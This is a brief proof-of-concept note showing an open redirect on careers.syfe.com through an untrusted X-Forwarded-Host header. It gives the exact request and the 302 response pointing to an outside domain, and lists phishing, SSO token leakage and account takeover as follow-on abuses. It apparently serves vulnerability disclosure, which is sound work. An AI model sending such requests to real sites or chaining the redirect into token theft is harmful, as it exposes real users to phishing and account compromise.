syfe open redir via careers subdomain

this proof-of-concept demonstrates an open redirect vulnerability caused by improper trust in the X-Forwarded-Host header on careers.syfe.com.

attack req

GET /login HTTP/2 Host: careers.syfe.com X-Forwarded-Host: c137req.github.io

result

HTTP/2 302 Found Location: https://c137req.github.io/jobs

because the server constructs redirect URLs using the unvalidated X-Forwarded-Host header, I can redirect users to an arbitrary domain

what could I do with this rn?

  • phishing
  • oauth/sso token leakage
  • password resetting (ato)
